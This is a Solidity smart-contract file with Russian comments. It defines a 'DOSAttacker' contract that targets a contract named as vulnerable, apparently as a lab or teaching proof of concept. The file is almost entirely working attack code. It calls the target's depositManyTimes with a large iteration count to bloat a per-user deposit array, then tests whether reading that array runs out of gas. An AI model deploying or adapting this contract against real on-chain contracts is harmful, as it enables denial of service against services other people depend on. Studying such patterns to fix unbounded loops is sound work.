// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableDepositManager {
    function depositManyTimes(uint256 iterations) external payable;
    function getUserDepositCount(address user) external view returns (uint256);
    function getUserDepositHistory(address user) external view returns (IVulnerableDepositManager.Deposit[] memory);
    
    struct Deposit {
        uint256 amount;
        uint256 timestamp;
    }
}

contract DOSAttacker {
    IVulnerableDepositManager public target;
    address public owner;
    
    constructor(address _target) {
        target = IVulnerableDepositManager(_target);
        owner = msg.sender;
    }
    
    // Основная функция атаки - создает огромное количество записей
    function launchDOSAttack(uint256 iterations) external payable {
        require(msg.value > 0, "Send ETH to attack");
        
        // Вызываем уязвимую функцию с большим количеством итераций
        target.depositManyTimes{value: msg.value}(iterations);
    }
    
    // Функция для проверки размера массива
    function checkArraySize() external view returns (uint256) {
        return target.getUserDepositCount(address(this));
    }
    
    // Функция для демонстрации проблемы - попытка чтения всего массива
    function demonstrateGasExhaustion() external view returns (bool) {
        try target.getUserDepositHistory(address(this)) returns (IVulnerableDepositManager.Deposit[] memory) {
            return true;
        } catch {
            return false;
        }
    }
    
    // Вспомогательная функция для возврата ETH
    function withdraw() external {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
    
    receive() external payable {}
}